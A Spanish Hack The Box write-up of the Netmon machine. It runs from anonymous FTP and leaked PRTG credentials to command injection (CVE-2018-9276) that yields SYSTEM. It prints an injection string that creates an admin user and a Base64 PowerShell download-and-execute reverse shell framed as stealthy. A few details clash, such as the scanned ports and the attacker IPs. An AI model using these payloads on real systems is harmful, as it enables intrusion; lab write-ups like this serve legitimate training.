---
tags:
  - type/writeup
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/Netmon
dificultad: Fácil
ip: 10.10.10.152
os: Windows
relacionados:
  - "[[FTP Enumeration]]"
  - "[[Information Leakage]]"
  - "[[Abusing PRTG Network Monitor]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[Bypass de Codificación con PowerShell]]"
---
# HackTheBox - Netmon

## Reconocimiento

### Escaneo de Puertos

Inicié mi reconocimiento con un escaneo de puertos exhaustivo sobre la IP `10.10.10.152`. Primero, identifiqué todos los puertos abiertos con una fase rápida y, posteriormente, lancé un escaneo más detallado sobre ellos para determinar los servicios y versiones.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 00_Reconnaissance/allports
nmap -sCV -p22,80 $(cat ip) -oN 00_Reconnaissance/sCV
```

Los resultados revelaron varios puertos de interés, pero los más destacados fueron:
- **Puerto 21/tcp:** Abierto, corriendo un servicio FTP que permitía el inicio de sesión anónimo.
- **Puerto 80/tcp:** Abierto, con un servidor web que alojaba **PRTG Network Monitor**.

### Servidor FTP

Al descubrir que el servidor FTP permitía el acceso anónimo, me conecté inmediatamente. Para mi sorpresa, parecía que la raíz del servidor FTP era el disco `C:` completo del sistema, lo que representa una grave mala configuración de seguridad.
```Bash
ftp 10.10.10.152
Name: anonymous
Password: <vacio>
```

Navegando por los directorios, encontré la flag de usuario en la carpeta `C:\Users\Public\Documents\user.txt`. Con acceso al sistema de archivos completo, mi siguiente paso fue buscar archivos de configuración sensibles.

## Análisis de vulnerabilidades

### Fuga de Información en Archivos de Configuración

Sabiendo que la máquina corría PRTG Network Monitor, investigué dónde almacena sus archivos de configuración. Una búsqueda rápida en Google me indicó que la ruta por defecto es `C:\ProgramData\Paessler`.

Navegué hacia ese directorio a través de FTP y encontré varios archivos de configuración. Los archivos `PRTG Configuration.dat` y `PRTG Configuration.old` son estándar, pero un archivo llamó mi atención: `PRTG Configuration.old.bak`. Los archivos de respaldo (`.bak`) a menudo contienen credenciales o información obsoleta pero aún válida.

Decidí descargar este archivo para analizarlo en mi máquina local.
```Bash
ftp> get "PRTG Configuration.old.bak"
```

Al inspeccionar el contenido del archivo, encontré credenciales en texto plano para el usuario `prtgadmin`.

> [!INFO] Credenciales Encontradas
> 
> Revisando el archivo PRTG Configuration.old.bak, localicé un usuario y una contraseña:
> 
> - **Usuario:** `prtgadmin`
>     
> - **Contraseña:** `PrTg@dmin2018`
>     

## Explotación de vulnerabilidades

### Autenticación en PRTG Network Monitor

Con las credenciales en mi poder, me dirigí a la interfaz web en el puerto 80 e intenté iniciar sesión con `prtgadmin` y `PrTg@dmin2018`. Sin embargo, la autenticación falló.

Dado que la contraseña contenía el año "2018" y el archivo era una copia de seguridad "antigua" (`.old.bak`), mi hipótesis fue que la contraseña podría haber sido actualizada siguiendo el mismo patrón. Probé con el año siguiente.
- **Usuario:** `prtgadmin`
- **Contraseña:** `PrTg@dmin2019`
    
Logré acceder al panel de PRTG Network Monitor con privilegios de administrador.

### Identificación de CVE-2018-9276

Una vez dentro del panel, identifiqué la versión del software en uso: **PRTG 18.1.37**. Realicé una búsqueda de vulnerabilidades para esta versión específica y rápidamente encontré **CVE-2018-9276**.

Esta vulnerabilidad afecta a todas las versiones de PRTG anteriores a la 18.1.39 y permite la **Ejecución Remota de Comandos (RCE)** no autenticada a través de la creación de notificaciones. Dado que el servicio de PRTG se ejecuta con privilegios de `NT AUTHORITY\SYSTEM`, explotar esta vulnerabilidad me daría control total sobre la máquina.

## Escalada de privilegios

Dado que la explotación del RCE me otorga directamente una shell como `SYSTEM`, este paso constituye mi escalada de privilegios final.

### Método 1: Creación de un Nuevo Usuario Administrador

El vector de ataque consiste en crear una nueva notificación y configurar una "Ejecución de Programa" como acción.

1. Navegué a `Setup > Account Settings > Notifications`.
2. Hice clic en "Add new notification".
3. En la sección "Execute Program", introduje un comando para crear un nuevo usuario (`htb`) y añadirlo al grupo de administradores locales. El `abc.txt |` al inicio es un truco para cumplir con el formato esperado por el campo, que requiere un nombre de archivo.
    ```DOS
    abc.txt | net user htb abc123! /add ; net localgroup administrators htb /add
    ```
4. Guardé la notificación. Para activarla, hice clic en el icono de la campana junto a ella.
    
Una vez ejecutado el comando en el servidor, utilicé `psexec.py` desde mi máquina para autenticarme con el nuevo usuario y obtener una shell de sistema.
```Bash
psexec.py htb:'abc123!'@10.10.10.152
```

Con esto, obtuve una shell interactiva como `NT AUTHORITY\SYSTEM`.

### Método 2: Reverse Shell con PowerShell (OPSEC)

> [!NOTE] Mejora de OPSEC
> 
> Crear un usuario en el sistema es una acción ruidosa que puede ser fácilmente detectada. Un método más sigiloso es obtener una reverse shell directamente en memoria.

El desafío de este método es que la interfaz web de PRTG codifica en HTML muchos caracteres especiales, lo que rompería un payload de reverse shell tradicional. Para evitar esto, utilicé la capacidad de PowerShell para ejecutar comandos codificados en Base64.

1. **Preparar el Payload:** Generé un payload de PowerShell para descargar y ejecutar el script `Invoke-PowerShellTcp.ps1` de Nishang. Es crucial codificar el comando en **UTF-16LE** antes de pasarlo a Base64, ya que es el formato que PowerShell espera.
    ```Bash
    # En mi máquina atacante, genero el comando codificado
    echo -n "IEX(new-object net.webclient).downloadstring('http://10.10.14.17/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
    ```

    El resultado fue: `SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMAMgAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQA=`
    
2. **Servir el Script y Escuchar:** Modifiqué `Invoke-PowerShellTcp.ps1` para que se conectara a mi IP (`10.10.16.32`) en el puerto `4444`. Luego, levanté un servidor web para alojarlo y puse un listener de Netcat a la escucha.
    ```Bash
    # Servidor web
    python3 -m http.server 80
    
    # Listener
    nc -lvnp 4444
    ```
    
2. **Ejecutar el Payload:** Creé una nueva notificación en PRTG con el siguiente comando, que decodifica y ejecuta nuestro payload en Base64.
    ```PowerShell
    abc.txt | powershell -enc <payload_base64>
    ```

Tras activar la notificación, recibí una conexión en mi listener, obteniendo nuevamente una shell como `NT AUTHORITY\SYSTEM`.


___

## Bandera(s)

> [!FLAG] `flag{user}`
> 54a4b9b6ccc209d2e1b433e7d1ab53a0
^bandera

> [!FLAG] `flag{root}`
> e0c9f1e1eb7bec27bd7cd47ef04b9046
^bandera